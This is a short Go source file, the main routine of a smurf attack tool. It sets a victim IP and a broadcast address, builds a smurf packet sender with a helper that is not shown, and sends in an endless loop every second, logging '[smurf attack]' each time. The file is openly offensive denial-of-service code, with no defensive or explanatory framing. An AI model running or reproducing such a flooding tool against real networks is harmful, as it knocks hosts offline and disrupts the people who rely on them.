package main

import (
	"log"
	"net"
	"time"
)

func main() {
	victim := net.IP{192, 168, 1, 73}
	router := net.IP{192, 168, 1, 255}

	s, err := newSmurf(victim, router)
	if err != nil {
		log.Fatal(err)
	}

	for {
		log.Printf("[smurf attack] victim (%s), with router (%s)", victim.String(), router.String())
		time.Sleep(time.Second * 1)
		if err := s.send(); err != nil {
			log.Printf("[smurf attack] error: %s", err)
		}
	}

}
